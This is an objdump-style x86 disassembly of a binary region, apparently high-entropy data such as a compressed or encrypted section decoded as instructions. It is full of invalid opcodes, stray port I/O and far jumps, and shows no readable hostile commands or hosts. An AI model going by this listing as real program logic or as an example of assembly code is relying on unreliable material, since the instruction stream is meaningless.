  4254fc:	retf   0xfb8c
  4254ff:	test   DWORD PTR [ebp-0xe],ebx
  425502:	cmp    DWORD PTR [esi-0x5e],esi
  425505:	jle    0x4254db
  425507:	jns    0x425489
  425509:	and    WORD PTR [esi],sp
  42550c:	jo     0x425495
  42550e:	and    ebp,DWORD PTR [ecx+0x42]
  425511:	xor    ecx,DWORD PTR [ebx]
  425513:	cmp    BYTE PTR [edi+eax*4],al
  425516:	xor    DWORD PTR ds:0xeb9d08df,ecx
  42551c:	rol    BYTE PTR [ecx],0x2a
  42551f:	mov    eax,ds:0x5fa75ac3
  425524:	sub    al,0xfb
  425526:	ds cmp ah,dh
  425529:	dec    eax
  42552a:	test   al,0xb2
  42552c:	jo     0x425506
  42552e:	jae    0x425562
  425530:	sub    al,dl
  425532:	pop    ss
  425533:	cli    
  425534:	out    dx,eax
  425535:	xor    ebx,DWORD PTR [ebx+0xbad784e]
  42553b:	dec    ebp
  42553c:	not    esi
  42553e:	jecxz  0x425596
  425540:	add    esi,DWORD PTR [esi-0x16]
  425543:	sti    
  425544:	jno    0x425553
  425546:	iret   
  425547:	mov    esp,0xf65bf234
  42554c:	les    edi,FWORD PTR [esi-0x7a]
  42554f:	arpl   cx,bx
  425551:	scas   eax,DWORD PTR es:[edi]
  425552:	dec    ebp
  425553:	(bad)  
  425555:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425556:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425557:	mov    eax,ds:0x6f2f0d53
  42555c:	xchg   ebx,eax
  42555d:	xchg   esp,eax
  42555e:	jbe    0x4255d3
  425560:	or     al,0xcd
  425562:	daa    
  425563:	xchg   edx,eax
  425564:	push   cs
  425565:	sub    BYTE PTR [ebx],ch
  425567:	hlt    
  425568:	sbb    DWORD PTR [ebx],0xc3741359
  42556e:	out    0xa1,al
  425570:	fwait
  425571:	xor    DWORD PTR [ebx],edx
  425573:	cmp    DWORD PTR [edi],esp
  425575:	jae    0x425545
  425577:	gs push edi
  425579:	jp     0x4255a0
  42557b:	push   cs
  42557c:	sbb    edi,edx
  42557e:	in     eax,0xc5
  425580:	data16 (bad) 
  425582:	out    dx,eax
  425583:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425584:	int    0x3b
  425586:	lods   eax,DWORD PTR ds:[esi]
  425587:	inc    ecx
  425588:	ss int3 
  42558a:	fwait
  42558b:	(bad)  
  42558c:	jmp    0x3f4f4422
  425591:	jmp    0x42558d
  425593:	ins    DWORD PTR es:[edi],dx
  425594:	dec    ebp
  425595:	mov    bl,0x5c
  425597:	add    al,0xbf
  425599:	aam    0x6c
  42559b:	(bad)  
  42559c:	sbb    BYTE PTR [esi-0x77],cl
  42559f:	addr16 sbb eax,0xdf8aa5c4
  4255a5:	ret    
  4255a6:	rol    BYTE PTR [ebp-0x6f0f8333],1
  4255ac:	(bad)
  4255b0:	inc    ebp
  4255b1:	or     DWORD PTR [ecx+0x7bf77ec7],0x4c91b2cf
  4255bb:	mov    dh,0x76
  4255bd:	shl    DWORD PTR [ebx],0x7b
  4255c0:	(bad)  
  4255c1:	cmp    BYTE PTR [edi+0x6c],cl
  4255c4:	mov    cl,BYTE PTR [ebx]
  4255c6:	mov    esi,0x3bcfab5e
  4255cb:	jp     0x42557c
  4255cd:	aam    0x97
  4255cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4255d0:	xor    BYTE PTR [ebx+eax*4+0x1a4e9932],al
  4255d7:	cmp    bl,BYTE PTR [esi]
  4255d9:	std    
  4255da:	popf   
  4255db:	xchg   ebx,eax
  4255dc:	sub    al,0x5d
  4255de:	ins    DWORD PTR es:[edi],dx
  4255df:	and    eax,DWORD PTR [ebx+0x5dd0c779]
  4255e5:	sti    
  4255e6:	mov    esp,DWORD PTR [edx]
  4255e8:	jmp    0xfd07:0x6277
	...
  425656:	(bad)  
  425657:	jmp    0xfef4:0xfe6e7a4e
  42565e:	dec    ebp
  42565f:	mov    esi,0xf7eaf13a
  425664:	sbb    al,0x77
  425666:	addr16 xchg ecx,eax
  425668:	add    DWORD PTR [eax],eax
  42566a:	add    BYTE PTR [ecx],al
  42566c:	add    BYTE PTR [eax],al
  42566e:	fnstsw WORD PTR [eax]
  425670:	out    0xbe,eax
  425672:	push   ss
  425673:	das    
  425674:	and    eax,0x7e9be87e
  425679:	into   
  42567a:	lea    edi,[edx-0x46061acc]
  425680:	mov    ecx,0xb0771af
  425685:	in     al,dx
  425686:	shr    BYTE PTR [esi+esi*4-0x4c],0xc6
  42568b:	add    eax,0x693b3a8c
  425690:	jbe    0x4256c1
  425692:	pop    ebp
  425693:	test   eax,0x30f4af55
  425698:	imul   ecx,DWORD PTR [edx],0xffffffba
  42569b:	inc    eax
  42569c:	inc    esp
  42569d:	gs push es
  42569f:	ins    BYTE PTR es:[edi],dx
  4256a0:	jns    0x425684
  4256a2:	mov    ch,0xb7
  4256a4:	(bad)  
  4256a5:	mov    edx,0x72f5bb21
  4256aa:	jne    0x425698
  4256ac:	mov    cl,0xdd
  4256ae:	jbe    0x425676
  4256b0:	outs   dx,BYTE PTR ds:[esi]
  4256b1:	aad    0xf
  4256b3:	mov    al,es:0xdf977ab8
  4256b9:	addr16 jge 0x4256dc
  4256bc:	shl    BYTE PTR [ebx+eiz*4],0x56
  4256c0:	push   ebx
  4256c1:	je     0x4256b4
  4256c3:	add    eax,0x31169265
  4256c8:	xchg   edx,eax
  4256c9:	repnz rcl al,cl
  4256cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4256cd:	inc    esi
  4256ce:	or     BYTE PTR [edi-0x3976ce91],bh
  4256d4:	jno    0x425725
  4256d6:	daa    
  4256d7:	xchg   BYTE PTR [ebx+0x47],cl
  4256da:	sbb    ecx,esi
  4256dc:	(bad)  
  4256dd:	addr16 into 
  4256df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4256e0:	add    edi,0xffffff93
  4256e3:	inc    ebp
  4256e4:	shl    BYTE PTR ds:0x6594efc8,0x8b
  4256eb:	pop    esi
  4256ec:	int    0xb0
  4256ee:	dec    esi
  4256ef:	dec    BYTE PTR [eax+0xa1c8933]
  4256f5:	nop
  4256f6:	adc    al,0x43
  4256f8:	xchg   DWORD PTR ss:[ebp-0x19],eax
  4256fc:	pop    edx
  4256fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4256fe:	pushf  
  4256ff:	leave  
  425700:	enter  0x7fcc,0xc1
  425704:	data16 or BYTE PTR [esi+0x74614431],dh
  42570b:	data16 je 0x4256f1
  42570e:	jmp    0x4256c2
  425710:	scas   al,BYTE PTR es:[edi]
  425711:	xchg   ecx,eax
  425712:	inc    eax
  425713:	dec    edi
  425714:	jnp    0x425712
  425716:	out    0x61,eax
  425718:	repz fstp QWORD PTR [esi]
  42571b:	int3   
  42571c:	test   DWORD PTR [esi-0x1e],esi
  42571f:	test   BYTE PTR [edx-0x18493c5c],al
  425725:	mov    ds:0x932547af,eax
  42572a:	mov    edx,0xcc4bedac
  42572f:	mov    ah,0xd8
  425731:	call   0x717b6c6
  425736:	jg     0x4256d2
  425738:	add    DWORD PTR [eax+0x10],ebp
  42573b:	push   cs
  42573c:	int3   
  42573d:	sbb    eax,0x39e656bb
  425742:	lods   al,BYTE PTR ds:[esi]
  425743:	sar    BYTE PTR [edx],0x3f
  425746:	das    
  425747:	shl    ebp,0x28
  42574a:	popa   
  42574b:	rcl    BYTE PTR [eax+0x5d],cl
  42574e:	cmp    al,BYTE PTR [edx]
  425750:	jb     0x425721
  425752:	(bad)  
  425753:	out    dx,eax
  425754:	jbe    0x4256dd
  425756:	loopne 0x425746
  425758:	jo     0x425724
  42575a:	jg     0x42573d
  42575c:	cld    
  42575d:	(bad)  
  42575f:	int3   
  425760:	xor    bl,BYTE PTR [esi+0x35332a49]
  425766:	ret    0x4079
  425769:	pop    esp
  42576a:	cs push esi
  42576c:	push   0x7f
	...
  4257d6:	(bad)  
  4257d7:	aaa    
  4257d8:	shl    BYTE PTR [ebx+esi*8],cl
  4257db:	cmc    
  4257dc:	div    bh
  4257de:	test   DWORD PTR [edi+0x3f],0xb2f9974
  4257e5:	pop    edx
  4257e6:	addr16 xchg edx,eax
  4257e8:	add    DWORD PTR [eax],eax
  4257ea:	add    BYTE PTR [ecx],al
  4257ec:	add    BYTE PTR [eax],al
  4257ee:	inc    esi
  4257ef:	pop    ebp
  4257f0:	ss inc esi
  4257f2:	jno    0x425780
  4257f4:	push   0xac0b0198
  4257f9:	addr16 mov ch,0xb3
  4257fc:	dec    ebx
  4257fd:	add    bh,cl
  4257ff:	add    ebx,DWORD PTR [ecx+0x76]
  425802:	lock sbb al,0x92
  425805:	mov    cl,cl
  425807:	test   ecx,eax
  425809:	sub    eax,0x4ab399e2
  42580e:	push   ebx
  42580f:	cs jae 0x42586b
  425812:	and    ax,0x8d9d
  425816:	clc    
  425817:	ins    BYTE PTR es:[edi],dx
  425818:	nop
  425819:	mov    ebx,ecx
  42581b:	mov    bl,0x23
  42581d:	pop    ds
  42581e:	inc    ebp
  42581f:	aas    
  425820:	dec    ecx
  425821:	cli    
  425822:	pop    ds
  425823:	rcr    DWORD PTR [edx],0x7b
  425826:	imul   edx,DWORD PTR [edx-0x4e],0x5942fce1
  42582d:	es das 
  42582f:	lea    ecx,[eax]
  425831:	lds    ecx,FWORD PTR [edx-0x35]
  425834:	pop    esi
  425835:	loopne 0x4257c8
  425837:	jno    0x4257c6
  425839:	lods   al,BYTE PTR ds:[esi]
  42583a:	or     BYTE PTR [ebx+0x47721906],ch
  425840:	mov    eax,ds:0xe6970614
  425845:	mov    eax,0xd17b85c4
  42584a:	sub    eax,0x79d0968b
  42584f:	(bad)  
  425850:	aas    
  425851:	mov    ds:0x38accf66,al
  425856:	enter  0x1521,0x7a
  42585a:	shl    DWORD PTR [ebx+0x47],cl
  42585d:	scas   eax,DWORD PTR es:[edi]
  42585e:	hlt    
  42585f:	pop    edx
  425860:	jae    0x8a665fdf
  425866:	inc    esp
  425867:	add    eax,0xc97df172
  42586c:	mov    ebp,0x7bd457f5
  425871:	call   0x956f:0xec7f27e1
  425878:	inc    edx
  425879:	cmc    
  42587a:	sub    eax,0x2be18847
  42587f:	jmp    0xf310:0x760a0634
  425886:	repz push ds
  425888:	fldcw  WORD PTR [ecx+0x39]
  42588b:	cld    
  42588c:	imul   eax,DWORD PTR [edi+esi*8-0x72],0x301c1207
  425894:	leave  
  425895:	cmc    
  425896:	pop    ds
  425897:	dec    esp
  425898:	xor    ebx,0x42d5625d
  42589e:	cmp    DWORD PTR [edi+0x69],ecx
  4258a1:	xor    BYTE PTR es:[esi+0x1c03f309],ah
  4258a8:	push   ebp
  4258a9:	test   edi,edi
  4258ab:	mov    WORD PTR [edx+0x2fe13454],fs
  4258b1:	imul   ebp,DWORD PTR [esi+0x3e],0xffffff88
  4258b5:	pop    ebx
  4258b6:	bound  esp,QWORD PTR [edx+0xe]
  4258b9:	mov    WORD PTR [esi+eax*1],ds
  4258bc:	mov    bl,0xe0
  4258be:	pop    ebp
  4258bf:	shl    DWORD PTR [edx-0x2d],1
  4258c2:	(bad)  
  4258c3:	pop    esp
  4258c4:	push   edx
  4258c5:	ins    DWORD PTR es:[edi],dx
  4258c6:	push   es
  4258c7:	pop    esp
  4258c8:	ret    
  4258c9:	enter  0xf132,0xc5
  4258cd:	jmp    0x42593c
  4258cf:	jns    0x4258ab
  4258d1:	cmc    
  4258d2:	jbe    0x425906
  4258d4:	or     ebx,DWORD PTR gs:[ebp-0x14]
  4258d8:	jnp    0x425942
  4258da:	xchg   ecx,eax
  4258db:	fistp  QWORD PTR [ebx-0x5689168c]
  4258e1:	inc    eax
  4258e2:	sub    esp,edx
  4258e4:	clc    
  4258e5:	sub    dl,BYTE PTR [ecx]
  4258e7:	dec    edi
  4258e8:	icebp  
  4258e9:	in     al,dx
  4258ea:	lock sub dh,BYTE PTR [edx]
  4258ed:	xlat   BYTE PTR ds:[ebx]
	...
  425956:	pop    esp
  425957:	push   edx
  425958:	nop
  425959:	push   edx
  42595a:	sahf   
  42595b:	rcr    dh,cl
  42595d:	pop    esi
  42595e:	adc    BYTE PTR [edx+0x55],0x71
  425962:	std    
  425963:	cmp    ch,BYTE PTR [eax+0x1936750]
  425969:	add    BYTE PTR [eax],al
  42596b:	add    DWORD PTR [eax],eax
  42596d:	add    BYTE PTR [ebx+0x16],bh
  425970:	and    edx,DWORD PTR [edx]
  425972:	es cwde 
  425974:	imul   esp,esp,0x9770c3a3
  42597a:	mov    ebx,0x6ad7f610
  42597f:	sub    BYTE PTR cs:[edx+0x23],al
  425983:	out    0xe2,al
  425985:	dec    edx
  425986:	push   0x706aafa4
  42598b:	mov    ecx,0x6f53a245
  425990:	or     al,0x8e
  425992:	lock bound esi,QWORD PTR [esi]
  425995:	dec    esi
  425996:	sbb    BYTE PTR [eax+0x72],ch
  425999:	dec    ebp
  42599a:	iret   
  42599b:	leave  
  42599c:	push   esi
  42599d:	pop    esp
  42599e:	sbb    ecx,esp
  4259a0:	adc    eax,0xbc0c781d
  4259a5:	xchg   esp,eax
  4259a6:	enter  0x10e3,0xc6
  4259aa:	sbb    ebp,ecx
  4259ac:	push   ds
  4259ad:	scas   al,BYTE PTR es:[edi]
  4259ae:	pop    es
  4259af:	imul   esp,DWORD PTR [edi-0x1e],0x18c057d7
  4259b6:	push   ds
  4259b7:	mov    bl,0xda
  4259b9:	push   0xf7bec4f2
  4259be:	into   
  4259bf:	inc    edi
  4259c0:	sub    edx,DWORD PTR [esi-0x3b71c401]
  4259c6:	es js  0x4259f7
  4259c9:	stos   DWORD PTR es:[edi],eax
  4259ca:	outs   dx,BYTE PTR ds:[esi]
  4259cb:	retf   0xbd5e
  4259ce:	gs cmp al,0xf1
  4259d1:	sbb    eax,0x609b1107
  4259d6:	and    ch,0x1f
  4259d9:	pop    esi
  4259da:	fsubr  DWORD PTR [ebx+0xe]
  4259dd:	not    BYTE PTR [ebx+0x59fac6e9]
  4259e3:	mov    ds:0xb57adf24,eax
  4259e8:	push   ds
  4259e9:	(bad)  [ebp+0x24d3cdfe]
  4259ef:	(bad)  
  4259f0:	cwde   
  4259f1:	mov    ecx,0xd14bbf2a
  4259f6:	add    BYTE PTR [ebx+0x5f582e34],ah
  4259fc:	push   eax
  4259fd:	in     al,0xa5
  4259ff:	pop    ds
  425a00:	push   esp
  425a01:	sbb    al,0x33
  425a03:	mov    eax,ds:0x7cf91582
  425a08:	pop    esi
  425a09:	jge    0x425a5f
  425a0b:	push   0xff776580
  425a10:	stos   DWORD PTR es:[edi],eax
  425a11:	mov    eax,ds:0xc058da2a
  425a16:	push   ebp
  425a17:	sub    DWORD PTR ds:0xb59a85ed,esi
  425a1d:	lock in eax,0x46
  425a20:	jae    0x425a49
  425a22:	mov    dh,0xd5
  425a24:	sub    al,0xe7
  425a26:	jb     0x4259e1
  425a28:	popf   
  425a29:	(bad)  
  425a2a:	out    dx,al
  425a2b:	sub    al,0xe4
  425a2d:	mov    eax,0x4ae4dec6
  425a32:	jno    0x4259e6
  425a34:	inc    ebp
  425a35:	xor    DWORD PTR [ebp+esi*4+0x901192f],edx
  425a3c:	jle    0xecfef6a2
  425a42:	stos   BYTE PTR es:[edi],al
  425a43:	xor    al,0xc2
  425a45:	mov    dl,0xf0
  425a47:	sub    dh,ch
  425a49:	inc    edi
  425a4a:	add    ah,BYTE PTR [edi+ecx*2]
  425a4d:	mov    WORD PTR ds:0xb1a23ede,ss
  425a53:	(bad)  
  425a54:	xchg   esp,eax
  425a55:	jmp    0x4259d8
  425a57:	pop    ebx
  425a58:	outs   dx,BYTE PTR ds:[esi]
  425a59:	push   ecx
  425a5a:	and    cl,0xf
  425a5d:	or     al,0xd8
  425a5f:	mov    ch,0x40
  425a61:	adc    cl,BYTE PTR [ecx-0xbdfa43]
  425a67:	icebp  
  425a68:	sub    ebx,ebx
  425a6a:	fisttp WORD PTR [eax+esi*4+0xa]
	...
  425ad6:	shl    DWORD PTR [ebx+0x4],0x67
  425ada:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425adb:	jcxz   0x425ac5
  425ade:	(bad)  
  425adf:	fimul  DWORD PTR [edi+eax*4+0x67fbf890]
  425ae6:	addr16 xchg esp,eax
  425ae8:	add    DWORD PTR [eax],eax
  425aea:	add    BYTE PTR [ecx],al
  425aec:	add    BYTE PTR [eax],al
  425aee:	inc    edx
  425aef:	dec    esp
  425af0:	pop    ds
  425af1:	mov    eax,0xd06094db
  425af6:	out    dx,al
  425af7:	lahf   
  425af8:	mov    edx,esi
  425afa:	xchg   edi,eax
  425afb:	add    esp,0xa050d62d
  425b01:	in     eax,0x11
  425b03:	scas   al,BYTE PTR es:[edi]
  425b04:	jecxz  0x425aac
  425b06:	or     edi,DWORD PTR [edi+0x22]
  425b09:	mov    esp,0x5883b2f2
  425b0e:	push   eax
  425b0f:	das    
  425b10:	and    ebp,ebp
  425b12:	sub    BYTE PTR ds:0x877cb47b,bl
  425b18:	fisubr DWORD PTR [edi-0x56]
  425b1b:	xor    DWORD PTR [edi],eax
  425b1d:	sbb    bl,BYTE PTR [ebx]
  425b1f:	push   ss
  425b20:	popa   
  425b21:	fwait
  425b22:	iret   
  425b23:	inc    edi
  425b24:	xchg   ebp,eax
  425b25:	bound  ebx,QWORD PTR [esi-0x6d]
  425b28:	or     al,0xe4
  425b2a:	ror    BYTE PTR ds:0xc685a6f0,1
  425b30:	imul   ecx,edi,0xcfd80bbb
  425b36:	cmp    cl,0xf9
  425b39:	jne    0x425b2c
  425b3b:	es or  eax,0xb4cb2776
  425b41:	loop   0x425b0a
  425b43:	adc    DWORD PTR [eax],ebp
  425b45:	or     BYTE PTR [edx],bh
  425b47:	cmp    al,0x1a
  425b49:	bswap  esi
  425b4b:	pop    edx
  425b4c:	arpl   WORD PTR [edx-0x36678062],ax
  425b52:	push   ebx
  425b53:	push   eax
  425b54:	shl    BYTE PTR [eax-0x73],0x9a
  425b58:	fwait
  425b59:	pop    ecx
  425b5a:	mov    ds:0xee8043f8,al
  425b5f:	jae    0x425ba6
  425b61:	sub    al,0x78
  425b63:	xchg   esi,eax
  425b64:	cmp    DWORD PTR [edi-0x5c],eax
  425b67:	jbe    0x425ba6
  425b69:	repnz xor edi,0x47
  425b6d:	stc    
  425b6e:	jp     0x425b63
  425b70:	aam    0x3b
  425b72:	xor    cl,ch
  425b74:	fs jb  0x425b39
  425b77:	dec    esp
  425b78:	adc    BYTE PTR [ebx],ah
  425b7a:	jo     0x425bb0
  425b7c:	pop    es
  425b7d:	mov    ah,0xe1
  425b7f:	hlt    
  425b80:	push   esp
  425b81:	into   
  425b82:	push   ecx
  425b83:	mov    dh,0xbf
  425b85:	xchg   edx,eax
  425b86:	xchg   esi,eax
  425b87:	mov    cl,0xa1
  425b89:	mov    ds:0xc2de761b,al
  425b8e:	loop   0x425b90
  425b90:	es mov eax,ecx
  425b93:	cdq    
  425b94:	or     BYTE PTR [edx-0x3c],cl
  425b97:	jp     0x425bc6
  425b99:	push   ebp
  425b9a:	loop   0x425c05
  425b9c:	cs fwait
  425b9e:	add    BYTE PTR [ebx],ah
  425ba0:	int3   
  425ba1:	call   0xab1d:0xa19cb036
  425ba8:	test   al,0x72
  425baa:	int    0x8b
  425bac:	sti    
  425bad:	test   al,0xe6
  425baf:	cmp    al,0xc0
  425bb1:	test   eax,0xbda6c89b
  425bb6:	js     0x425b83
  425bb8:	push   edi
  425bb9:	push   ss
  425bba:	int3   
  425bbb:	in     al,dx
  425bbc:	jno    0x425b58
  425bbe:	cmp    eax,0x6e7cc762
  425bc3:	adc    al,0x92
  425bc5:	mov    ds:0xfb5b090f,eax
  425bca:	jp     0x425bcd
  425bcc:	aas    
  425bcd:	sub    ebp,DWORD PTR [esi+edi*1]
  425bd0:	mov    dh,0x11
  425bd2:	outs   dx,DWORD PTR ds:[esi]
  425bd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425bd4:	xchg   BYTE PTR [esi-0x1a],dh
  425bd7:	inc    ecx
  425bd8:	(bad)  
  425bd9:	jns    0x425bdb
  425bdb:	retf   
  425bdc:	(bad)  
  425bde:	pop    eax
  425bdf:	adc    al,0x28
  425be1:	sahf   
  425be2:	sahf   
  425be3:	sbb    al,0xcc
  425be5:	out    dx,eax
  425be6:	or     BYTE PTR [esi],dh
  425be8:	pop    edi
  425be9:	sub    al,0x1b
  425beb:	push   cs
  425bec:	(bad)  
  425bed:	jge    0x425bef
	...
  425c53:	add    BYTE PTR [eax],al
  425c55:	add    ah,al
  425c57:	clc    
  425c58:	jnp    0x425cb0
  425c5a:	jg     0x425c33
  425c5c:	in     eax,dx
  425c5d:	cli    
  425c5e:	enter  0xe6cd,0x96
  425c62:	fnstsw WORD PTR [edx]
  425c64:	add    DWORD PTR [ebx],ebx
  425c66:	addr16 xchg ebp,eax
  425c68:	add    DWORD PTR [eax],eax
  425c6a:	add    BYTE PTR [ecx],al
  425c6c:	add    BYTE PTR [eax],al
  425c6e:	jp     0x425c19
  425c70:	popf   
  425c71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425c72:	out    dx,al
  425c73:	push   ebp
  425c74:	adc    BYTE PTR [edx-0x4e],cl
  425c77:	adc    eax,DWORD PTR [ecx]
  425c79:	cmc    
  425c7a:	bound  eax,QWORD PTR [edx+0x27376b20]
  425c80:	bound  esi,QWORD PTR [esi]
  425c82:	xchg   BYTE PTR [eax],ah
  425c84:	cwde   
  425c85:	nop
  425c86:	or     ecx,DWORD PTR [ebx-0x42]
  425c89:	cmp    ebp,DWORD PTR [ecx-0x7624955b]
  425c8f:	aad    0x94
  425c91:	push   edi
  425c92:	mov    BYTE PTR [ecx+0x56],al
  425c95:	call   0x2517:0xd32bc0f7
  425c9c:	inc    ebp
  425c9d:	or     BYTE PTR [esi+0x4942b4df],dl
  425ca3:	inc    esp
  425ca4:	and    DWORD PTR [eax+0x57],ecx
  425ca7:	(bad)  
  425ca8:	hlt    
  425ca9:	xchg   esp,eax
  425caa:	push   ebx
  425cab:	sub    ebx,DWORD PTR [edx]
  425cad:	dec    edx
  425cae:	add    DWORD PTR ds:0xed90685b,ecx
  425cb4:	pop    ecx
  425cb5:	out    dx,eax
  425cb6:	in     al,0xc3
  425cb8:	sbb    DWORD PTR [edi-0x1cb9f7dc],esp
  425cbe:	dec    edx
  425cbf:	mov    esi,0xf997945d
  425cc4:	and    BYTE PTR [ebx],al
  425cc6:	and    al,0x45
  425cc8:	cwde   
  425cc9:	js     0x425d0c
  425ccb:	push   ebx
  425ccc:	shr    ebx,cl
  425cce:	nop
  425ccf:	shl    al,cl
  425cd1:	jne    0x425d14
  425cd3:	cmp    ch,dl
  425cd5:	cmp    al,0x29
  425cd7:	(bad)
  425cdb:	in     al,dx
  425cdc:	ret    
  425cdd:	pop    ebx
  425cde:	pop    ebx
  425cdf:	xchg   edx,eax
  425ce0:	cmp    ebp,0xffffffdf
  425ce3:	fld    DWORD PTR [ecx+0x4c5a28f0]
  425ce9:	adc    edx,DWORD PTR [edx+ebx*1-0x63]
  425ced:	xlat   BYTE PTR ds:[ebx]
  425cee:	clc    
  425cef:	fdivr  QWORD PTR [edi]
  425cf1:	cmp    ch,bl
  425cf3:	and    DWORD PTR [edi+0x2ee2a1e2],edi
  425cf9:	cli    
  425cfa:	aas    
  425cfb:	sbb    bh,BYTE PTR [ebx+0x17]
  425cfe:	xchg   esp,eax
  425cff:	outs   dx,DWORD PTR ds:[esi]
  425d00:	mov    edx,0xc2bbb8df
  425d05:	mov    esp,0xd4dee95
  425d0a:	add    DWORD PTR [edi],eax
  425d0c:	xchg   esi,eax
  425d0d:	addr16 and dh,ah
  425d10:	mov    bh,0x33
  425d12:	mov    WORD PTR ds:0x8679ae6f,es
  425d18:	adc    DWORD PTR [ebx+0x142ec06c],ebp
  425d1e:	cwde   
  425d1f:	aas    
  425d20:	stos   DWORD PTR es:[edi],eax
  425d21:	rol    BYTE PTR [ebp-0x55],1
  425d24:	pop    eax
  425d25:	adc    eax,0x4b96f4c8
  425d2a:	iret   
  425d2b:	ja     0x425d74
  425d2d:	add    ch,BYTE PTR [ebx-0x49]
  425d30:	les    ebp,FWORD PTR [ebx]
  425d32:	and    al,0x16
  425d34:	mov    esi,gs
  425d36:	ins    DWORD PTR es:[edi],dx
  425d37:	in     al,0x79
  425d39:	xor    BYTE PTR [ebp+0x2ae08c64],0x6b
  425d40:	push   0x5530f441
  425d45:	mov    edx,0x5b2d7122
  425d4a:	call   0x961f4b
  425d4f:	call   0xeaa0:0xcb00a52c
  425d56:	pop    edx
  425d57:	fs push eax
  425d59:	push   0xffffffdd
  425d5b:	jp     0x64d7b850
  425d61:	inc    ecx
  425d62:	mov    eax,0x41971aee
  425d67:	sar    DWORD PTR [esp+edi*1],0xca
  425d6b:	jno    0x425cf4
  425d6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  425dd6:	jmp    FWORD PTR [esp+ebx*8-0x8820f9]
  425ddd:	cld    
  425dde:	gs addr16 stc 
  425de1:	mov    ds:0xc46b535f,al
  425de6:	addr16 xchg esi,eax
  425de8:	add    DWORD PTR [eax],eax
  425dea:	add    BYTE PTR [ecx],al
  425dec:	add    BYTE PTR [eax],al
  425dee:	hlt    
  425def:	int3   
  425df0:	mov    DWORD PTR [edx],ebp
  425df2:	mov    esp,DWORD PTR [ebp-0x658d68ac]
  425df8:	dec    esi
  425df9:	jge    0x425e27
  425dfb:	fbld   TBYTE PTR [edx-0x7c]
  425dfe:	or     eax,DWORD PTR [edi]
  425e00:	sahf   
  425e01:	clc    
  425e02:	fs aad 0xcd
  425e05:	dec    ebx
  425e06:	mov    eax,0x6fa56f8d
  425e0b:	loop   0x425e07
  425e0d:	aam    0x41
  425e0f:	jge    0x425e33
  425e11:	call   0x83c9:0x887ac834
  425e18:	int3   
  425e19:	shr    BYTE PTR [edi+0x6d9742d0],0x35
  425e20:	stc    
  425e21:	push   esi
  425e22:	les    ebx,FWORD PTR [edx]
  425e24:	mov    ebp,0xcd58f129
  425e29:	repnz sbb bh,bh
  425e2c:	jmp    0x97bcd96c
  425e31:	retf   
  425e32:	adc    al,0xce
  425e34:	repz aad 0x32
  425e37:	es xchg ebp,eax
  425e39:	adc    al,0x55
  425e3b:	sbb    eax,0x2cec84b1
  425e40:	xchg   ecx,eax
  425e41:	rcr    DWORD PTR [eax-0x3bb3ff7c],cl
  425e47:	mov    esi,edi
  425e49:	je     0x425e5a
  425e4b:	outs   dx,DWORD PTR ds:[esi]
  425e4c:	jecxz  0x425e87
  425e4e:	mov    ds:0xdf8ce729,al
  425e53:	ss test al,0xa4
  425e56:	mov    edx,0x1e6dd7e1
  425e5b:	inc    ebx
  425e5c:	pop    ebx
  425e5d:	lds    edi,FWORD PTR ds:0xf48cc91b
  425e63:	mov    esi,DWORD PTR [edx]
  425e65:	(bad)  
  425e66:	in     eax,0x9a
  425e68:	aaa    
  425e69:	pop    DWORD PTR [edi+0x1e]
  425e6c:	dec    eax
  425e6d:	lods   al,BYTE PTR ds:[esi]
  425e6e:	mov    ebx,0x2f7082f1
  425e73:	mov    ebp,0xe39b8259
  425e78:	call   0x1aebbe9f
  425e7d:	push   ecx
  425e7e:	aam    0x6d
  425e80:	fisttp DWORD PTR [ebx-0xd]
  425e83:	mov    db4,eax
  425e86:	mov    ch,BYTE PTR [eax-0x4e]
  425e89:	fldcw  WORD PTR [ecx]
  425e8b:	pop    eax
  425e8c:	sub    edi,DWORD PTR ds:0x23ccd548
  425e92:	xchg   edx,eax
  425e93:	pop    es
  425e94:	scas   eax,DWORD PTR es:[edi]
  425e95:	push   esp
  425e96:	jae    0x425edd
  425e98:	mov    esp,0x61cbddbf
  425e9d:	retf   0xdab9
  425ea0:	jnp    0x425f18
  425ea2:	sub    DWORD PTR [esi],0x12e28b75
  425ea8:	ror    BYTE PTR [edx-0x6f],0xf0
  425eac:	inc    ebx
  425ead:	shl    DWORD PTR [esi],0x43
  425eb0:	cwde   
  425eb1:	sbb    bh,BYTE PTR [eax]
  425eb3:	mov    dh,0x8d
  425eb5:	fwait
  425eb6:	arpl   WORD PTR [edi-0x53],bp
  425eb9:	inc    eax
  425eba:	xor    cl,BYTE PTR [edx+esi*1]
  425ebd:	scas   eax,DWORD PTR es:[edi]
  425ebe:	push   esp
  425ebf:	out    dx,eax
  425ec0:	jmp    0x425ed9
  425ec2:	mov    ds:0xc8b4c27f,al
  425ec7:	test   BYTE PTR [ecx+0x144a8151],bl
  425ecd:	mov    ebp,0x2c062f2b
  425ed2:	fld    DWORD PTR [ecx+eiz*1-0x6c]
  425ed6:	dec    eax
  425ed7:	jmp    0xdf58aaa8
  425edc:	rol    eax,0x2c
  425edf:	xchg   edi,eax
  425ee0:	data16 fcom DWORD PTR [edx-0x3629469c]
  425ee7:	pop    ebp
  425ee8:	pop    eax
  425ee9:	mov    ebp,0x246ffe94
	...
  425f56:	(bad)  
  425f57:	jl     0x425faa
  425f59:	sar    bl,1
  425f5b:	std    
  425f5c:	(bad)  
  425f5d:	jle    0x425f2b
  425f5f:	pop    ss
  425f60:	popf   
  425f61:	scas   eax,DWORD PTR es:[edi]
  425f62:	jmp    0x197:0x67bc3b7c
  425f69:	add    BYTE PTR [eax],al
  425f6b:	add    DWORD PTR [eax],eax
  425f6d:	add    BYTE PTR [ebx-0x30c89c66],ah
  425f73:	mov    ds:0x5aeb3ec,eax
  425f78:	push   edi
  425f79:	sbb    BYTE PTR [esi+0x60d1a685],ch
  425f7f:	lock cmp al,0xda
  425f82:	sbb    eax,0xeeb625c9
  425f87:	es out 0x14,eax
